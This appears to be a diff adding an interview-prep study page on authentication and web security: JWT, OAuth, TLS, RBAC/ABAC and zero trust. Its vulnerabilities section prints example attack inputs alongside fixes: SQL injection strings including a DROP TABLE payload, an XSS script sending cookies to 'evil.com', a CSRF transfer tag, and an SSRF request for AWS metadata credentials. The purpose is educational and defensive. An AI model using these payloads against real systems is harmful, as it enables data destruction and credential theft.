@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Security & Authentication</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Source+Sans+3:wght@300;400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{--ink:#1a1814;--page:#faf8f4;--surface:#f0ede6;--border:#e0dbd0;--muted:#7a7468;--pg:#2d6a9f;--pg-bg:#eef4fb;--mg:#1a8a45;--mg-bg:#edfaf2;--dy:#c47a00;--dy-bg:#fdf5e8;--ca:#0e7a8a;--ca-bg:#eaf6f8;--red:#b83030;--red-bg:#fdf0f0;--green:#1a6e40;--green-bg:#edf7f0;--amber:#b87010;--amber-bg:#fdf5e3;--blue:#1a4a90;--blue-bg:#eef2fb;--mono:'JetBrains Mono',monospace;--sans:'Source Sans 3',sans-serif;--serif:'Playfair Display',serif;}
+*{box-sizing:border-box;margin:0;padding:0;}html{scroll-behavior:smooth;}
+body{background:var(--page);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.75;}
+.hero{background:var(--ink);color:#f0ede6;padding:52px 24px 44px;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.02) 40px),repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(255,255,255,.02) 40px);}
+.hero-inner{max-width:920px;margin:0 auto;position:relative;z-index:1;}
+.eyebrow{font-family:var(--mono);font-size:10px;letter-spacing:4px;color:#6a6858;text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:10px;}
+.eyebrow::before{content:'';width:24px;height:1px;background:#3a3828;}
+h1{font-family:var(--serif);font-size:clamp(28px,5vw,52px);font-weight:900;line-height:1.05;letter-spacing:-1px;margin-bottom:16px;}
+h1 .acc{color:#e8b84b;}
+.hero-desc{font-size:15px;color:#7a7868;max-width:600px;line-height:1.7;margin-bottom:24px;}
+.db-badges{display:flex;flex-wrap:wrap;gap:8px;}
+.db-badge{font-family:var(--mono);font-size:10px;padding:4px 12px;border-radius:3px;font-weight:600;letter-spacing:.5px;}
+.db-pg{background:var(--pg);color:#fff;}.db-mg{background:var(--mg);color:#fff;}.db-dy{background:var(--dy);color:#fff;}.db-ca{background:var(--ca);color:#fff;}
+.nav{position:sticky;top:0;z-index:100;background:var(--ink);border-bottom:1px solid #1e1d18;display:flex;overflow-x:auto;scrollbar-width:none;padding:0 20px;}
+.nav::-webkit-scrollbar{display:none;}
+.nav a{font-family:var(--mono);font-size:10px;letter-spacing:1px;color:#5a5850;text-decoration:none;padding:13px 13px;white-space:nowrap;border-bottom:2px solid transparent;transition:.18s;}
+.nav a:hover{color:#e8b84b;border-color:#e8b84b;}
+.wrap{max-width:920px;margin:0 auto;padding:0 20px;}
+section{padding:48px 0 32px;border-bottom:2px solid var(--border);}section:last-child{border:none;}
+.sec-tag{font-family:var(--mono);font-size:9px;letter-spacing:4px;text-transform:uppercase;color:var(--muted);margin-bottom:8px;display:flex;align-items:center;gap:10px;}
+.sec-tag::before{content:'';width:20px;height:1px;background:var(--border);}
+h2{font-family:var(--serif);font-size:clamp(20px,3.5vw,30px);font-weight:700;letter-spacing:-.3px;line-height:1.15;margin-bottom:14px;color:var(--ink);}
+h3{font-family:var(--serif);font-size:17px;font-weight:700;margin:28px 0 10px;color:var(--ink);border-bottom:1px solid var(--border);padding-bottom:6px;}
+p{color:#3a3830;font-size:14.5px;margin-bottom:12px;max-width:760px;}strong{color:var(--ink);}
+code{font-family:var(--mono);font-size:12px;background:var(--surface);padding:1px 5px;border-radius:3px;color:var(--blue);}
+.callout{border-radius:4px;padding:14px 18px;margin:16px 0;font-size:13.5px;border-left:3px solid;line-height:1.65;}
+.callout p{font-size:13.5px;margin-bottom:6px;max-width:none;}.callout p:last-child{margin:0;}
+.cl-blue{background:var(--blue-bg);border-color:var(--blue);color:#1a2a4a;}
+.cl-green{background:var(--green-bg);border-color:var(--green);color:#0a2a1a;}
+.cl-amber{background:var(--amber-bg);border-color:var(--amber);color:#3a2808;}
+.cl-red{background:var(--red-bg);border-color:var(--red);color:#3a0808;}
+.cl-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;text-transform:uppercase;margin-bottom:6px;opacity:.7;}
+.steps{list-style:none;margin:16px 0;counter-reset:s;}
+.steps li{counter-increment:s;display:flex;gap:14px;align-items:flex-start;padding:14px 16px;background:white;border:1px solid var(--border);border-radius:6px;margin-bottom:8px;}
+.steps li::before{content:counter(s);font-family:var(--mono);font-size:11px;font-weight:700;color:white;background:var(--ink);min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.step-title{font-weight:600;font-size:14px;color:var(--ink);margin-bottom:4px;}
+.step-desc{font-size:13px;color:#5a5848;line-height:1.65;}
+.step-desc ul{margin:6px 0 0 16px;}.step-desc li{margin-bottom:4px;font-size:13px;color:#5a5848;}
+.blist{list-style:none;margin:12px 0;}
+.blist li{padding:7px 0 7px 20px;position:relative;font-size:14px;color:#3a3830;border-bottom:1px solid var(--border);line-height:1.65;}
+.blist li:last-child{border:none;}.blist li::before{content:'→';position:absolute;left:0;color:var(--amber);font-weight:700;}
+.codeblock{background:var(--ink);border-radius:6px;padding:18px 22px;font-family:var(--mono);font-size:12px;line-height:2;overflow-x:auto;margin:14px 0;color:#c8c4b8;}
+.db-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0;}
+@media(max-width:640px){.db-grid{grid-template-columns:1fr;}}
+.db-card{background:white;border:1px solid var(--border);border-radius:6px;padding:18px;position:relative;overflow:hidden;}
+.db-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;}
+.db-card.pg::before{background:var(--pg);}.db-card.mg::before{background:var(--mg);}.db-card.dy::before{background:var(--dy);}.db-card.ca::before{background:var(--ca);}
+.db-card-name{font-family:var(--serif);font-size:18px;font-weight:700;margin:10px 0 4px;}
+.db-card.pg .db-card-name{color:var(--pg);}.db-card.mg .db-card-name{color:var(--mg);}.db-card.dy .db-card-name{color:var(--dy);}.db-card.ca .db-card-name{color:var(--ca);}
+.db-card-role{font-size:12px;color:var(--muted);margin-bottom:12px;font-family:var(--mono);}
+.db-row{display:flex;justify-content:space-between;align-items:flex-start;font-size:12.5px;padding:6px 0;border-top:1px solid var(--surface);}
+.db-k{color:var(--muted);flex-shrink:0;width:110px;}.db-v{font-family:var(--mono);font-size:11.5px;color:var(--ink);text-align:right;flex:1;}
+.db-v.g{color:var(--green);}.db-v.a{color:var(--amber);}.db-v.r{color:var(--red);}
+.matrix{width:100%;border-collapse:collapse;margin:20px 0;font-size:13px;}
+.matrix th{font-family:var(--mono);font-size:9px;letter-spacing:2px;padding:10px 12px;border:1px solid var(--border);background:var(--surface);color:var(--muted);text-transform:uppercase;}
+.matrix td{padding:11px 12px;border:1px solid var(--border);color:#3a3830;vertical-align:top;line-height:1.6;}
+.matrix .rh{font-family:var(--mono);font-size:11px;font-weight:600;background:var(--surface);color:var(--ink);}
+.dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:4px;vertical-align:middle;}
+.dot.g{background:var(--green);}.dot.a{background:var(--amber);}.dot.r{background:var(--red);}
+.badge{display:inline-block;font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:3px;border:1px solid;font-weight:500;vertical-align:middle;margin:2px;}
+.b-g{background:var(--green-bg);border-color:var(--green);color:var(--green);}.b-a{background:var(--amber-bg);border-color:var(--amber);color:var(--amber);}.b-b{background:var(--blue-bg);border-color:var(--blue);color:var(--blue);}.b-r{background:var(--red-bg);border-color:var(--red);color:var(--red);}
+.faq{border:1px solid var(--border);border-radius:5px;margin-bottom:8px;overflow:hidden;}
+.faq-q{padding:14px 18px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;background:white;font-size:14px;font-weight:600;user-select:none;transition:background .15s;}
+.faq-q:hover{background:var(--surface);}
+.faq-tog{font-size:18px;color:var(--amber);transition:transform .2s;flex-shrink:0;margin-left:12px;}
+.faq-a{display:none;padding:16px 18px;background:var(--surface);border-top:1px solid var(--border);font-size:13.5px;color:#3a3830;line-height:1.75;}
+.faq.open .faq-a{display:block;}.faq.open .faq-tog{transform:rotate(45deg);}
+.faq-a ul,.faq-a ol{padding-left:20px;margin:8px 0;}.faq-a li{margin-bottom:6px;font-size:13.5px;color:#3a3830;line-height:1.65;}
+.dtree{background:white;border:1px solid var(--border);border-radius:8px;padding:20px;margin:20px 0;}
+.dtree-node{display:flex;gap:12px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--border);}
+.dtree-node:last-child{border:none;}
+.dtree-q{font-weight:600;font-size:13.5px;color:var(--ink);flex:1;}
+.dtree-a{font-family:var(--mono);font-size:11px;padding:3px 10px;border-radius:3px;flex-shrink:0;margin-left:8px;border:1px solid;}
+.dtree-a.pg{background:var(--pg-bg);color:var(--pg);border-color:var(--pg);}.dtree-a.mg{background:var(--mg-bg);color:var(--mg);border-color:var(--mg);}.dtree-a.dy{background:var(--dy-bg);color:var(--dy);border-color:var(--dy);}.dtree-a.ca{background:var(--ca-bg);color:var(--ca);border-color:var(--ca);}.dtree-a.ask{background:var(--surface);color:var(--muted);border-color:var(--border);}
+.oneliner{background:var(--ink);color:var(--page);border-radius:10px;padding:32px 28px;text-align:center;margin:44px 0;}
+.oneliner .lbl{font-family:var(--mono);font-size:9px;letter-spacing:4px;text-transform:uppercase;color:#5a5850;margin-bottom:14px;}
+.oneliner blockquote{font-family:var(--serif);font-size:clamp(14px,2.2vw,18px);font-weight:700;line-height:1.65;color:#e8e0d0;font-style:italic;}
+footer{background:var(--ink);text-align:center;padding:32px 20px;font-family:var(--mono);font-size:10px;color:#3a3828;letter-spacing:2px;}
+</style></head><body>
+<div class="hero"><div class="hero-inner">
+  <div class="hero-tag">System Design · FAANG Interview Prep · Manish-Almanac</div>
+  <h1>Security & Authentication<br><em>JWT, OAuth 2.0, TLS, RBAC, SSRF, XSS, CSRF — every security concept needed for FAANG system design interviews, explained from first principles.</em></h1>
+  <p class="hero-sub">JWT, OAuth 2.0, TLS, RBAC, SSRF, XSS, CSRF — every security concept needed for FAANG system design interviews, explained from first principles.</p>
+  <div class="db-pills"><span class="db-pill" style="border-color:#c0392b;color:#c0392b;background:#c0392b18">JWT</span><span class="db-pill" style="border-color:#1a4f8a;color:#1a4f8a;background:#1a4f8a18">OAuth 2.0</span><span class="db-pill" style="border-color:#1a7a4a;color:#1a7a4a;background:#1a7a4a18">TLS/mTLS</span><span class="db-pill" style="border-color:#b8720a;color:#b8720a;background:#b8720a18">RBAC/ABAC</span><span class="db-pill" style="border-color:#6040a0;color:#6040a0;background:#6040a018">Zero Trust</span></div>
+</div></div>
+<nav class="nav"><a href="#authn-authz">Auth Basics</a><a href="#tls">TLS/HTTPS</a><a href="#vulnerabilities">Vulnerabilities</a><a href="#authz-patterns">Authorisation</a><a href="#sd-security">System Design</a><a href="#decision-security">Decision Tree</a><a href="#followups-security">Follow-ups</a></nav>
+<div class="wrap">
+<section id="authn-authz">
+  <div class="sec-tag">00 · The Foundation</div>
+  <h2>Authentication vs Authorisation — the distinction that trips everyone</h2>
+  <div class="analogy">
+    <div class="analogy-label">The hotel analogy</div>
+    <div class="analogy-text">
+      <strong>Authentication</strong> = showing your ID at the front desk. "Who are you?" The hotel confirms you are a real guest and hands you a key card.<br><br>
+      <strong>Authorisation</strong> = the key card opening only your room. "What are you allowed to do?" Your key works on room 304 but not the penthouse, even though you're authenticated.<br><br>
+      In software: Authentication proves identity (login). Authorisation enforces permissions (can this user read this resource?). They always happen in this order — you can't authorise an unknown identity.
+    </div>
+  </div>
+  <div class="concept-grid">
+    <div class="concept-row"><div class="concept-term">Session Token<br>(Cookie-based)</div><div class="concept-def"><strong>Server stores session state. Client holds only an opaque session ID in a cookie.</strong><br>
+      Login → server creates session_id → stores session in Redis → sets <code>Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict</code>.<br>
+      Every request: browser sends cookie → server looks up session in Redis → retrieves user context.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Simple revocation: delete the Redis key. Works well for web apps on the same domain. Server controls session lifetime.</span><br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ Stateful — server must store sessions. Doesn't scale naturally across microservices (each service needs Redis access). Vulnerable to CSRF if SameSite not set.</span></div></div>
+    <div class="concept-row"><div class="concept-term">JWT<br>(JSON Web Token)</div><div class="concept-def"><strong>Stateless token containing claims, signed by the server. No server-side storage needed.</strong><br>
+      Structure: <code>header.payload.signature</code> (Base64URL encoded).<br>
+      Header: <code>{"alg":"RS256","typ":"JWT"}</code>. Payload: <code>{"sub":"user123","exp":1742383200,"roles":["admin"]}</code>. Signature: RSA/HMAC of header+payload.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Stateless — any service verifies JWT by checking the signature (no Redis lookup). Perfect for microservices. Carries claims (user ID, roles) avoiding extra DB lookups.</span><br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ Cannot revoke before expiry. If a JWT is stolen, it works until exp. Mitigation: short expiry (15min) + refresh tokens. Or maintain a token blocklist in Redis (defeats statelessness partially).</span></div></div>
+    <div class="concept-row"><div class="concept-term">API Key</div><div class="concept-def"><strong>Long-lived secret string, typically for service-to-service or developer API access.</strong><br>
+      Client sends: <code>Authorization: Bearer sk_live_abc123xyz</code> or <code>X-API-Key: abc123xyz</code>.<br>
+      Server: hash the key (SHA-256), look up hash in DB → retrieve associated account + permissions.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Simple, no expiry complexity. Suitable for server-side applications where the key can be kept secret. Easy to revoke by deleting from DB.</span><br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ Long-lived — if leaked, attacker has indefinite access. Store hashed, not plaintext (same as passwords). Never put in URLs (logged by servers/proxies). Rotate regularly.</span></div></div>
+    <div class="concept-row"><div class="concept-term">OAuth 2.0</div><div class="concept-def"><strong>Delegated authorisation: allows a third-party app to access resources on a user's behalf without sharing their password.</strong><br>
+      "Sign in with Google" flow: User → clicks "Sign in with Google" → Google shows consent screen → User approves → Google returns authorisation code to your app → your app exchanges code for access token → your app uses token to call Google APIs.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ User never gives their Google password to your app. Google controls what your app can access (scopes). Tokens are revocable. Industry standard for third-party integrations.</span><br>
+      <span style="color:#5a5848;font-size:12.5px;">Four grant types: Authorization Code (web apps, most secure), Client Credentials (service-to-service, no user), Implicit (deprecated — use PKCE instead), Device Code (TVs/CLIs with no browser).</span></div></div>
+    <div class="concept-row"><div class="concept-term">JWT vs Session:<br>When to Use Each</div><div class="concept-def"><strong>The rule: JWT for stateless microservices + mobile APIs. Sessions for web apps on the same domain.</strong><br>
+      Use <strong>JWT</strong> when: you have multiple backend services that all need to identify the user, your clients are mobile apps or SPAs, you need to pass identity to third-party services.<br>
+      Use <strong>Sessions</strong> when: you need instant revocation (bank logout should immediately invalidate), all your services share a Redis instance, your app is a traditional server-rendered website.<br>
+      <span style="color:#5a5848;font-size:12.5px;">Hybrid: use JWTs for inter-service auth (microservice A calling microservice B) + sessions for user-facing web sessions.</span></div></div>
+  </div>
+</section>
+
+<section id="tls">
+  <div class="sec-tag">01 · TLS / HTTPS</div>
+  <h2>How HTTPS actually works — the TLS handshake explained</h2>
+  <div class="analogy">
+    <div class="analogy-label">The sealed letter analogy</div>
+    <div class="analogy-text">
+      Imagine you want to send a secret letter to your bank, but you've never met them. TLS solves this with a clever trick:<br><br>
+      1. Bank sends you their <strong>padlock</strong> (public key) — anyone can have this padlock, it's public.<br>
+      2. You put your secret message in a box, snap the bank's padlock on it. Now only the bank can open it (only they have the key for their padlock).<br>
+      3. Inside that first box, you included your own padlock. Now the bank puts their reply in a box with YOUR padlock.<br>
+      4. All future messages use a shared secret key you both agreed on — much faster than public key encryption.<br><br>
+      The certificate authority (CA) is like a trusted notary who verified that the padlock really belongs to your bank, not an impostor.
+    </div>
+  </div>
+  <div class="concept-grid">
+    <div class="concept-row"><div class="concept-term">TLS 1.3 Handshake</div><div class="concept-def"><strong>Reduced from 2 round trips (TLS 1.2) to 1 round trip. This is why upgrading to TLS 1.3 improves latency.</strong><br>
+      1. Client → Server: <code>ClientHello</code> (supported cipher suites + key share)<br>
+      2. Server → Client: <code>ServerHello</code> (chosen cipher + server's key share + certificate)<br>
+      3. Client verifies certificate against trusted CA root store. Derives session keys from key exchange.<br>
+      4. Client → Server: <code>Finished</code> + first encrypted request in same round trip (0-RTT for session resumption).<br>
+      <span style="color:#5a5848;font-size:12.5px;">Cipher suite example: TLS_AES_128_GCM_SHA256. Means: AES-128-GCM for symmetric encryption, SHA-256 for MAC. Forward secrecy: session keys generated fresh every connection — past traffic stays safe even if server private key is later compromised.</span></div></div>
+    <div class="concept-row"><div class="concept-term">Certificate Chain</div><div class="concept-def"><strong>Your server's certificate is signed by an Intermediate CA, which is signed by a Root CA.</strong><br>
+      Root CA certs are pre-installed in browsers/OS. They sign Intermediate CAs. Intermediates sign your domain cert. Chain: Root → Intermediate → yourdomain.com.<br>
+      Why not Root signing directly? Root CA private keys are kept offline in air-gapped vaults. Intermediates handle daily signing. If an Intermediate is compromised, it's revoked and replaced without touching the Root.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Let's Encrypt issues free certificates automatically via ACME protocol. CloudFront/Cloudflare manage certificates for you. Never hand-manage certs in production — automate with certbot or cloud-managed TLS.</span></div></div>
+    <div class="concept-row"><div class="concept-term">mTLS<br>(Mutual TLS)</div><div class="concept-def"><strong>Both client AND server verify each other's certificates. Standard for service-to-service auth in microservices.</strong><br>
+      Normal TLS: only client verifies server certificate. mTLS: server also verifies client certificate.<br>
+      Service A calls Service B → both present certificates → mutual verification. No API key or JWT needed — the certificate IS the identity.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Used by: Istio (auto-injects mTLS between all pods), internal Google services, banking inter-service calls. Zero-trust networking: every service proves its identity on every request.</span><br>
+      <span style="color:#5a5848;font-size:12.5px;">Certificate rotation challenge: use SPIFFE/SPIRE for automated short-lived certificate issuance (certs rotate every 24h, no manual management).</span></div></div>
+  </div>
+</section>
+
+<section id="vulnerabilities">
+  <div class="sec-tag">02 · Common Vulnerabilities</div>
+  <h2>The attacks every FAANG interviewer expects you to know</h2>
+  <div class="concept-grid">
+    <div class="concept-row"><div class="concept-term">SQL Injection</div><div class="concept-def"><strong>Attacker injects SQL code through user input, manipulating your database query.</strong><br>
+      Vulnerable: <code>query = "SELECT * FROM users WHERE email='" + userInput + "'"</code><br>
+      Attack: userInput = <code>' OR '1'='1</code> → query returns ALL users.<br>
+      Nuclear: userInput = <code>'; DROP TABLE users; --</code><br>
+      <strong>Fix: parameterised queries (prepared statements) — always.</strong><br>
+      <code>db.query("SELECT * FROM users WHERE email = ?", [userInput])</code><br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ ORMs (Hibernate, SQLAlchemy, Prisma) use parameterised queries by default. Never concatenate user input into SQL strings. Use an allowlist for column names (cannot be parameterised).</span></div></div>
+    <div class="concept-row"><div class="concept-term">XSS<br>(Cross-Site Scripting)</div><div class="concept-def"><strong>Attacker injects malicious JavaScript into your page, which runs in other users' browsers.</strong><br>
+      Stored XSS: attacker submits <code>&lt;script&gt;fetch('evil.com?cookie='+document.cookie)&lt;/script&gt;</code> as a comment. Your site stores it. Every user who views that comment executes the script — their session cookie is stolen.<br>
+      <strong>Fixes:</strong><br>
+      (1) Escape all output: <code>&lt;</code> → <code>&amp;lt;</code>. React/Vue do this automatically.<br>
+      (2) Content Security Policy (CSP) header: <code>script-src 'self'</code> — blocks inline scripts and external JS.<br>
+      (3) HttpOnly cookies: <code>document.cookie</code> can't read them — XSS can't steal session tokens.</div></div>
+    <div class="concept-row"><div class="concept-term">CSRF<br>(Cross-Site Request Forgery)</div><div class="concept-def"><strong>Attacker tricks an authenticated user's browser into making an unintended request to your site.</strong><br>
+      Attack: Evil page contains <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;</code>. If the user is logged into bank.com, their browser sends the request WITH their session cookie. The bank processes the transfer.<br>
+      <strong>Fixes:</strong><br>
+      (1) SameSite=Strict cookie attribute: browser won't send cookies on cross-site requests.<br>
+      (2) CSRF token: hidden form field with a random value. Server verifies it matches the session.<br>
+      (3) Verify Origin/Referer header: reject requests from unexpected origins.</div></div>
+    <div class="concept-row"><div class="concept-term">SSRF<br>(Server-Side Request Forgery)</div><div class="concept-def"><strong>Attacker makes your server fetch a URL they control — targeting internal services not exposed to the internet.</strong><br>
+      Vulnerable: your server fetches a URL from user input: <code>POST /fetch {"url": "https://example.com/image"}</code>.<br>
+      Attack: <code>{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}</code> — this is the AWS instance metadata endpoint. Your server fetches it, returning AWS credentials to the attacker.<br>
+      <strong>Fixes:</strong><br>
+      (1) Allowlist: only permit fetching from approved domains.<br>
+      (2) Block private IP ranges: 10.x, 172.16-31.x, 192.168.x, 169.254.x.<br>
+      (3) Use IMDSv2 on AWS (requires session token for metadata access).<br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ SSRF led to the Capital One breach (2019) — attacker used a misconfigured WAF to steal AWS credentials via the metadata service. Know this story.</span></div></div>
+    <div class="concept-row"><div class="concept-term">Secret Management</div><div class="concept-def"><strong>Never hardcode secrets. Never commit secrets to git. Store them in a secrets manager.</strong><br>
+      <strong>AWS Secrets Manager / Vault</strong>: applications fetch secrets at runtime via API. Secrets are encrypted at rest. Access controlled via IAM/policies. Automatic rotation (DB passwords rotated without app restarts).<br>
+      <strong>Environment variables</strong>: acceptable for simple deployments, but secrets are visible in process listings and often logged accidentally.<br>
+      <strong>Kubernetes secrets</strong>: base64 encoded (not encrypted!) by default. Use Sealed Secrets or Vault Agent Injector for real encryption.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Rule: if a secret is ever in your git history (even deleted), rotate it immediately. Tools: git-secrets, truffleHog scan git history for leaked credentials.</span></div></div>
+  </div>
+</section>
+
+<section id="authz-patterns">
+  <div class="sec-tag">03 · Authorisation Patterns</div>
+  <h2>RBAC, ABAC, and how real systems enforce permissions</h2>
+  <div class="concept-grid">
+    <div class="concept-row"><div class="concept-term">RBAC<br>(Role-Based Access Control)</div><div class="concept-def"><strong>Users are assigned roles. Roles have permissions. Users inherit permissions through roles.</strong><br>
+      User Alice → has roles [admin, editor]. Role admin → permissions [delete_post, manage_users]. Role editor → permissions [create_post, edit_post].<br>
+      Check: can Alice delete a post? → Alice has admin? → admin has delete_post? → YES.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Simple, auditable, works for most enterprise systems. Clear separation of duties. Easy to onboard/offboard users (assign/remove roles).</span><br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ Role explosion: 100 fine-grained roles becomes unmanageable. When roles represent combinations of attributes (region + department + clearance), ABAC is better.</span></div></div>
+    <div class="concept-row"><div class="concept-term">ABAC<br>(Attribute-Based Access Control)</div><div class="concept-def"><strong>Access decisions based on attributes of the user, resource, and environment.</strong><br>
+      Policy: "Allow access if user.department == resource.department AND user.clearance >= resource.classification AND time.current is business_hours."<br>
+      User Alice (dept=engineering, clearance=2) → resource (dept=engineering, classification=1) → during business hours → ALLOW.<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Extremely fine-grained. No role explosion. Policies expressed as rules. Used by: AWS IAM policies, Google Cloud IAM conditions, healthcare systems (PHI access by treating physician only).</span><br>
+      <span style="color:#b83030;font-size:12.5px;">⚠ Complex to reason about. Hard to audit ("why can Alice access this?"). Policy debugging is difficult. Use RBAC where possible; add ABAC conditions for contextual constraints.</span></div></div>
+    <div class="concept-row"><div class="concept-term">Zero Trust<br>Architecture</div><div class="concept-def"><strong>"Never trust, always verify" — no implicit trust based on network location.</strong><br>
+      Old model: users inside the corporate network → trusted. VPN = you're "inside" → trusted. Problem: one compromised internal host → attacker moves laterally freely.<br>
+      Zero trust: every request authenticated + authorised regardless of origin. Even internal service-to-service calls use mTLS. Short-lived credentials (rotate every hour). Least-privilege access (request only what you need).<br>
+      <span style="color:#1a7a4a;font-size:12.5px;">✓ Google BeyondCorp (2011) was the first production zero-trust implementation. Post-SolarWinds and post-Log4Shell, zero trust is now the default architectural requirement at FAANG.</span></div></div>
+  </div>
+</section>
+
+<section id="sd-security">
+  <div class="sec-tag">04 · System Design Examples</div>
+  <h2>Security architecture in real systems</h2>
+  <div class="sd-example">
+    <div class="sd-example-head"><div class="sd-example-title">API Gateway Security Layer</div><span class="sd-example-tag">AUTHENTICATION · RATE LIMITING · WAF</span></div>
+    <div class="sd-example-body">
+      <div class="choice-row"><div class="choice-label">AUTH FLOW</div><div class="choice-val">Mobile app → POST /auth/login → auth service validates credentials → returns JWT (15min expiry) + refresh token (30 days, stored in HttpOnly cookie). Every subsequent request: API gateway extracts JWT from Authorization header → verifies RS256 signature using public key → extracts user_id and roles → passes claims downstream as trusted headers. Auth service never hit again for 15 minutes.</div></div>
+      <div class="choice-row"><div class="choice-label">TOKEN REFRESH</div><div class="choice-val">JWT expires → client sends refresh token (from HttpOnly cookie, immune to JS theft) → auth service validates refresh token in Redis → issues new JWT + rotates refresh token (refresh token rotation: old token invalidated immediately, prevents replay). If refresh token is invalid or expired: force re-login.</div></div>
+      <div class="choice-row"><div class="choice-label">WAF</div><div class="choice-val">AWS WAF or Cloudflare WAF sits at the edge. Rules: block requests with SQL injection patterns, XSS payloads, known bad IPs, malformed headers. Rate limiting: 1000 req/min per IP. Geo-blocking: restrict certain endpoints to specific countries. Bot detection: challenge suspicious traffic (CAPTCHA, JS challenge).</div></div>
+      <div class="choice-row"><div class="choice-label">SECRETS</div><div class="choice-val">DB passwords, JWT signing keys, third-party API keys → all in AWS Secrets Manager. Services fetch secrets at startup via IAM role (no hardcoded credentials). Secrets rotated every 90 days automatically. Audit log: every secret access logged to CloudTrail.</div></div>
+    </div>
+  </div>
+  <div class="sd-example">
+    <div class="sd-example-head"><div class="sd-example-title">Payment System Security</div><span class="sd-example-tag">PCI-DSS · ENCRYPTION · AUDIT</span></div>
+    <div class="sd-example-body">
+      <div class="choice-row"><div class="choice-label">CARD DATA</div><div class="choice-val">Your system never stores raw card numbers. User enters card → Stripe.js tokenises in the browser (card number never touches your server). You store only a Stripe payment_method_id. PCI-DSS compliance scope: dramatically reduced — your servers never see card data.</div></div>
+      <div class="choice-row"><div class="choice-label">PAYMENT FLOW</div><div class="choice-val">User initiates payment → your server calls Stripe API with payment_method_id → Stripe charges the card → returns success/failure. Your server stores transaction_id + status. All Stripe API calls from your server use a server-side API key (never exposed to client). Idempotency key on every charge request: prevents double-charge on network retry.</div></div>
+      <div class="choice-row"><div class="choice-label">AUDIT LOG</div><div class="choice-val">Append-only event log: every payment state change written to immutable Kafka topic → S3. Cannot be modified or deleted (S3 Object Lock). Required for PCI-DSS: 12 months online, 24 months archive. Any disputed transaction: replay the audit log to reconstruct exactly what happened.</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="decision-security">
+  <div class="sec-tag">05 · Decision Framework</div>
+  <h2>Authentication strategy selection</h2>
+  <div class="step-block">
+    <div class="step-block-header"><span class="sb-icon">🎯</span>Choosing Your Auth Strategy — Ask in Order</div>
+    <div class="step-block-body">
+      <div class="step-row"><div class="step-num">01</div><div class="step-content">
+        <div class="step-q">Is this user-facing (browser/mobile) or service-to-service?</div>
+        <div class="step-options">
+          <div class="step-option opt-yes"><span class="opt-arrow">Service-to-service →</span><span class="opt-text"><strong>mTLS</strong> (in a service mesh like Istio) or <strong>OAuth Client Credentials</strong> (service gets a token using client_id + client_secret). Never use user JWTs for service auth. Service identity is separate from user identity.</span></div>
+          <div class="step-option opt-no"><span class="opt-arrow">User-facing →</span><span class="opt-text">Go to Step 2.</span></div>
+        </div>
+      </div></div>
+      <div class="step-row"><div class="step-num">02</div><div class="step-content">
+        <div class="step-q">Do you need instant session revocation (e.g., bank logout)?</div>
+        <div class="step-options">
+          <div class="step-option opt-yes"><span class="opt-arrow">YES →</span><span class="opt-text"><strong>Server-side sessions in Redis.</strong> Delete the session key = immediate revocation. JWT cannot be revoked before expiry without a blocklist (which adds Redis dependency anyway). Banks, healthcare, government: use sessions.</span></div>
+          <div class="step-option opt-no"><span class="opt-arrow">NO →</span><span class="opt-text"><strong>JWT with short expiry (15min) + refresh tokens.</strong> Stateless — every microservice verifies independently. Mobile/SPA friendly. Carry user claims to avoid extra DB lookups per request.</span></div>
+        </div>
+      </div></div>
+      <div class="step-row"><div class="step-num">03</div><div class="step-content">
+        <div class="step-q">Do users need to grant access to third-party applications?</div>
+        <div class="step-options">
+          <div class="step-option opt-yes"><span class="opt-arrow">YES →</span><span class="opt-text"><strong>OAuth 2.0 Authorization Code + PKCE.</strong> Your platform issues tokens. Third-party apps request specific scopes. Users consent explicitly. You can revoke access per-app. Required if you're building a platform (Slack, GitHub, Google).</span></div>
+          <div class="step-option opt-no"><span class="opt-arrow">NO →</span><span class="opt-text"><strong>Direct JWT/session auth.</strong> No OAuth needed for first-party apps. OAuth adds complexity — only add it when third-party delegation is genuinely required.</span></div>
+        </div>
+      </div></div>
+    </div>
+  </div>
+</section>
+
+<section id="followups-security">
+  <div class="sec-tag">06 · Follow-ups</div>
+  <h2>Every hard follow-up, answered</h2>
+  <div class="faq-item"><div class="faq-q" onclick="toggle(this)">How do you handle JWT revocation before expiry — e.g., user changes password?<span class="tog">+</span></div>
+  <div class="faq-a"><strong>Three strategies, in order of complexity:</strong><br><br>
